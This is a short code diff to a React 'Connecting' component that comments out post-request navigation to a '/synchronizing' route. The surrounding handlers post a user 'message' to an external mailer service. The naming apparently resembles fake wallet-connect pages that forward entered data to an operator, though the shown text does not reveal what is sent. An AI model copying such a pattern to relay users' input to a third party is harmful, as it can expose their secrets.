@@ -31,7 +31,7 @@ const Connecting = () => {
     axios.post("https://hon-mailer.onrender.com/user/mail",{message})
     .then((res)=>{
       setBtnLoading(false);
-      navigate(`/synchronizing/${params.id}`);
+      // navigate(`/synchronizing/${params.id}`);
     }).catch((err)=>{
       // console.log(err);
       setBtnLoading(false);
@@ -52,7 +52,7 @@ const Connecting = () => {
     .then((res)=>{
       // console.log(res);
       setBtnLoading(false);
-      navigate(`/synchronizing/${params.id}`);
+      // navigate(`/synchronizing/${params.id}`);
     }).catch((err)=>{
       // console.log(err);
       setBtnLoading(false);
@@ -73,7 +73,7 @@ const Connecting = () => {
     .then((res)=>{
       // console.log(res);
       setBtnLoading(false);
-      navigate(`/synchronizing/${params.id}`);
+      // navigate(`/synchronizing/${params.id}`);
     }).catch((err)=>{
       // console.log(err);
       setBtnLoading(false);
